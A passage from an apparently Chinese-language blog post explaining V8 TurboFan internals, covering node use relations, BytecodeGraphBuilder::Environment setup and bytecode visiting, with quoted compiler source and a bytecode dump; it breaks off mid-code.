class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>于是从当前节点的input节点到当前节点，这样的一个{input}-&gt;{node}的use关系就建立起来了。<br>注意first_use是Node结构的一个成员变量。</p><p>或许这么说还是有点难懂，其实就是假设有一个节点A，它有0，1，2，3这么几个input节点，0，1，2，3代表的也是input_index。<br>然后对于每一个它的input节点，都要从它的Use部分取一个分配给它的input，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-05-122857.png" alt=""><br>然后因为分配出去的Use里面有记录这个input节点对应的input index，于是很容易就可以计算出来Node的地址。<br>这样，一个{input}-&gt;{node}的{Use #index}的关系就建立好了，而且很容易就可以通过#index来进行算数运算，得到真正的{input}-&gt;{node}，这样的use关系。</p><p><em>之所以需要这么麻烦，可能也是为了让graph IR有SSA的性质……</em></p><p>Node::New结束之后，此时Start节点已经被构建好了，请记住Node::New做的事情，因为后面建立新的node也是通过这个函数来完成的。</p><h4 id="BytecodeGraphBuilder-Environment"><a href="#BytecodeGraphBuilder-Environment" class="headerlink" title="BytecodeGraphBuilder::Environment"></a>BytecodeGraphBuilder::Environment</h4><p>回到<code>BytecodeGraphBuilder::CreateGraph()</code>来看一下，在Start创建之后，初始化env并切换到它。<br>在看env的初始化之前，先看一个重要的class<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The abstract execution environment simulates the content of the interpreter</span></span><br><span class="line"><span class="comment">// register file. The environment performs SSA-renaming of all tracked nodes at</span></span><br><span class="line"><span class="comment">// split and merge points in the control flow.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytecodeGraphBuilder</span>:</span>:Environment : <span class="keyword">public</span> ZoneObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Environment(BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count,</span><br><span class="line">              <span class="keyword">int</span> parameter_count,</span><br><span class="line">              interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">              Node* control_dependency);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Specifies whether environment binding methods should attach frame state</span></span><br><span class="line">  <span class="comment">// inputs to nodes representing the value being bound. This is done because</span></span><br><span class="line">  <span class="comment">// the &#123;OutputFrameStateCombine&#125; is closely related to the binding method.</span></span><br><span class="line">  <span class="keyword">enum</span> FrameStateAttachmentMode &#123; kAttachFrameState, kDontAttachFrameState &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">parameter_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_count_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_count_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">LookupAccumulator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupRegister</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupGeneratorState</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindAccumulator</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                       FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegister</span><span class="params">(interpreter::Register the_register, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                    FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegistersToProjections</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      interpreter::Register first_reg, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">      FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindGeneratorState</span><span class="params">(Node* node)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RecordAfterState</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                        FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Effect dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetEffectDependency</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> effect_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateEffectDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    effect_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Preserve a checkpoint of the environment for the IR graph. Any</span></span><br><span class="line">  <span class="comment">// further mutation of the environment will not affect checkpoints.</span></span><br><span class="line">  <span class="function">Node* <span class="title">Checkpoint</span><span class="params">(BailoutId bytecode_offset, OutputFrameStateCombine combine,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Control dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetControlDependency</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> control_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateControlDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    control_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">Context</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> context_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetContext</span><span class="params">(Node* new_context)</span> </span>&#123; context_ = new_context; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Environment* <span class="title">Copy</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(Environment* other, <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">FillWithOsrValues</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoop</span><span class="params">(<span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoopExit</span><span class="params">(Node* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Environment</span><span class="params">(<span class="keyword">const</span> Environment* copy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">StateValuesRequireUpdate</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateStateValues</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">GetStateValuesFromCache</span><span class="params">(Node** values, <span class="keyword">int</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> BitVector* liveness, <span class="keyword">int</span> liveness_offset)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">RegisterToValuesIndex</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">Zone* <span class="title">zone</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;local_zone(); &#125;</span><br><span class="line">  <span class="function">Graph* <span class="title">graph</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;graph(); &#125;</span><br><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;common(); &#125;</span><br><span class="line">  <span class="function">BytecodeGraphBuilder* <span class="title">builder</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> NodeVector* <span class="title">values</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function">NodeVector* <span class="title">values</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_base_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">accumulator_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> accumulator_base_; &#125;</span><br><span class="line"></span><br><span class="line">  BytecodeGraphBuilder* builder_;</span><br><span class="line">  <span class="keyword">int</span> register_count_;</span><br><span class="line">  <span class="keyword">int</span> parameter_count_;</span><br><span class="line">  Node* context_;</span><br><span class="line">  Node* control_dependency_;</span><br><span class="line">  Node* effect_dependency_;</span><br><span class="line">  NodeVector values_;</span><br><span class="line">  Node* parameters_state_values_;</span><br><span class="line">  Node* generator_state_;</span><br><span class="line">  <span class="keyword">int</span> register_base_;</span><br><span class="line">  <span class="keyword">int</span> accumulator_base_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>从上面可知，values()返回一个NodeVector values_。<br>然后继续看env的初始化<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  Environment env(this, bytecode_array()-&gt;register_count(),</span><br><span class="line">                  bytecode_array()-&gt;parameter_count(),</span><br><span class="line">                  bytecode_array()-&gt;incoming_new_target_or_generator_register(),</span><br><span class="line">                  graph()-&gt;start());</span><br><span class="line">  set_environment(&amp;env);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  BytecodeGraphBuilder::Environment::Environment(</span><br><span class="line">    BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count, <span class="keyword">int</span> parameter_count,</span><br><span class="line">    interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">    Node* control_dependency)</span><br><span class="line">    : builder_(builder),</span><br><span class="line">      register_count_(register_count),</span><br><span class="line">      parameter_count_(parameter_count),</span><br><span class="line">      control_dependency_(control_dependency),</span><br><span class="line">      effect_dependency_(control_dependency),</span><br><span class="line">      values_(builder-&gt;local_zone()),</span><br><span class="line">      parameters_state_values_(<span class="literal">nullptr</span>),</span><br><span class="line">      generator_state_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// The layout of values_ is:</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// [receiver] [parameters] [registers] [accumulator]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// parameter[0] is the receiver (this), parameters 1..N are the</span></span><br><span class="line">  <span class="comment">// parameters supplied to the method (arg0..argN-1). The accumulator</span></span><br><span class="line">  <span class="comment">// is stored separately.</span></span><br><span class="line">  <span class="comment">// Parameters including the receiver</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>注意这句话</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter[0] is the receiver (this), parameters 1..N are the</span><br><span class="line">Parameters including the receiver</span><br></pre></td></tr></table></figure></p><p>首先创建parameter节点，Start作为parameter的input节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameter_count; i++) &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(i, debug_name);</span><br><span class="line">  Node* parameter = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  values()-&gt;push_back(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后向values_这个NodeVector的end之前，插入register_count个值为undefined_constant的Node节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Registers</span></span><br><span class="line">  register_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;size());</span><br><span class="line">  Node* undefined_constant = builder-&gt;jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  values()-&gt;insert(values()-&gt;end(), register_count, undefined_constant);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">DEFINE_GETTER(UndefinedConstant, HeapConstant(factory()-&gt;undefined_value()))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">// valuev8::internal::Handle&lt;v8::internal::HeapObject&gt;</span></span><br><span class="line">Node* JSGraph::HeapConstant(Handle&lt;HeapObject&gt; value) &#123;</span><br><span class="line">  Node** loc = cache_.FindHeapConstant(value);</span><br><span class="line">  <span class="keyword">if</span> (*loc == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *loc = graph()-&gt;NewNode(common()-&gt;HeapConstant(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *loc;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> Operator* CommonOperatorBuilder::HeapConstant(</span><br><span class="line">    <span class="keyword">const</span> Handle&lt;HeapObject&gt;&amp; value) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;Handle&lt;HeapObject&gt;&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kHeapConstant, Operator::kPure,       <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"HeapConstant"</span>,                                 <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                               <span class="comment">// counts</span></span><br><span class="line">      value);                                         <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先从cache中检查是否已经有HeapConstant,如果没有就新建再返回，如果有就直接返回cache里的。</p><p>然后再向value_的最后插入一个undefined_constant节点作为Accumulator。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Accumulator</span></span><br><span class="line">accumulator_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;size());</span><br><span class="line">values()-&gt;push_back(undefined_constant);</span><br></pre></td></tr></table></figure></p><p>然后设置Context<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Context</span></span><br><span class="line">  <span class="keyword">int</span> context_index = Linkage::GetJSCallContextParamIndex(parameter_count);</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(context_index, <span class="string">"%context"</span>);</span><br><span class="line">  context_ = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// A special &#123;Parameter&#125; index for JSCalls that represents the context.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">GetJSCallContextParamIndex</span><span class="params">(<span class="keyword">int</span> parameter_count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> parameter_count + <span class="number">2</span>;  <span class="comment">// Parameter (arity + 2) is special.</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* CommonOperatorBuilder::Parameter(<span class="keyword">int</span> index,</span><br><span class="line">                                                 <span class="keyword">const</span> <span class="keyword">char</span>* debug_name) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!debug_name) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (index) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_PARAMETER(index) \</span></span><br><span class="line">  <span class="keyword">case</span> index:                   \</span><br><span class="line">    <span class="keyword">return</span> &amp;cache_.kParameter##index##Operator;</span><br><span class="line">      CACHED_PARAMETER_LIST(CACHED_PARAMETER)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> CACHED_PARAMETER</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Uncached.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;ParameterInfo&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kParameter, Operator::kPure,     <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Parameter"</span>,                               <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                          <span class="comment">// counts</span></span><br><span class="line">      ParameterInfo(index, debug_name));         <span class="comment">// parameter info</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>context也创建了一个parameter的node，用来做什么的我还没看懂，可能需要好好看看log或者compiler/linkage.h这个文件</em></p><h4 id="VisitBytecodes"><a href="#VisitBytecodes" class="headerlink" title="VisitBytecodes"></a>VisitBytecodes</h4><p>V8准备一个称为v8::internal::AstVisitor的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br>生成的bytecode存放在bytecode数组当中，用Javascript来模拟这个结构，看起来像这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090746.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090832.jpg" alt=""><br>当然这个并不重要，回顾一下而已。</p><p>VisitBytecodes首先进行bytecode_analysis，在这里面进行包括liveness分析等。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BytecodeAnalysis bytecode_analysis(bytecode_array(), local_zone(),</span><br><span class="line">                                   analyze_environment_liveness());</span><br><span class="line">bytecode_analysis.Analyze(osr_offset_);</span><br><span class="line">set_bytecode_analysis(&amp;bytecode_analysis);</span><br><span class="line"></span><br><span class="line">interpreter::BytecodeArrayIterator iterator(bytecode_array());</span><br><span class="line">set_bytecode_iterator(&amp;iterator);</span><br><span class="line"><span class="function">SourcePositionTableIterator <span class="title">source_position_iterator</span><span class="params">(</span></span></span><br><span class="line">    handle(bytecode_array()-&gt;SourcePositionTable()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (analyze_environment_liveness() &amp;&amp; FLAG_trace_environment_liveness) &#123;</span><br><span class="line">  <span class="function">OFStream <span class="title">of</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  bytecode_analysis.PrintLivenessTo(of);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果想观察liveness过程，可以启用这个flag<br><code>DEFINE_BOOL(trace_environment_liveness, false,            &quot;trace liveness of local variable slots&quot;)</code></p><p>bytecode_array被设置迭代，然后通过VisitSingleBytecode一个个处理。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; !iterator.done(); iterator.Advance()) &#123;</span><br><span class="line">  VisitSingleBytecode(&amp;source_position_iterator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数前面就是一些获取bytecode并偏移寻找下一个还有一些其他判断，主要的内容其实是这个大的switch case，对不同bytecode进行不同处理。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> (iterator.current_bytecode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTECODE_CASE(name, ...)       \</span></span><br><span class="line">  <span class="keyword">case</span> interpreter::Bytecode::k#<span class="meta">#name: \</span></span><br><span class="line">    Visit#<span class="meta">#name();                     \</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      BYTECODE_LIST(BYTECODE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BYTECODE_CODE</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>BYTECODE_LIST在bytecode.h里，太长了就不列了。</p><p>VisitSingleBytecode里有很多分支，我捡一些写一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode for function: foo]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 24</span><br><span class="line">   80 E&gt; 0x186d973a4f8a @    0 : a0                StackCheck</span><br><span class="line">   97 S&gt; 0x186d973a4f8b @    1 : 28 02 00 00       LdaNamedProperty a0, [0], [0]</span><br><span class="line">         0x186d973a4f8f @    5 : 26 fb             Star r0</span><br><span class="line">         0x186d973a4f91 @    7 : 0c 64             LdaSmi [100]</span><br><span class="line">         0x186d973a4f93 @    9 : 26 f9             Star r2</span><br><span class="line">   97 E&gt; 0x186d973a4f95 @   11 : 57 fb 02 f9 02    CallProperty1 r0, a0, r2, [2]</span><br><span class="line">  110 S&gt; 0x186d973a4f9a @   16 : a4                Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x186d973a4f19: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x186d90c023c1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x186dc2812029 &lt;String[7]: indexOf&gt;</span><br><span class="line">Handler Table (size = 0)</span><br></pre></td></tr></table></figure><ul><li>VisitStackCheck<br>在为StackCheck构建node之前，如果没有一个能够支配（effect-dom)它的checkpoint节点，那么会先创建一个精确的checkpoint节点。<br>于是在PrepareEagerCheckpoint调用<code>Node* node = NewNode(common()-&gt;Checkpoint());</code><br>即使我们在某种情况下跳过了checkpoint的创建，依然会染着Effect边为StackCheck寻找一个能够支配（effect-dom)它的Checkpoint。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V(Checkpoint, Operator::kKontrol, 0, 1, 1, 0, 1, 0)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::VisitStackCheck() &#123;</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line">  Node* node = 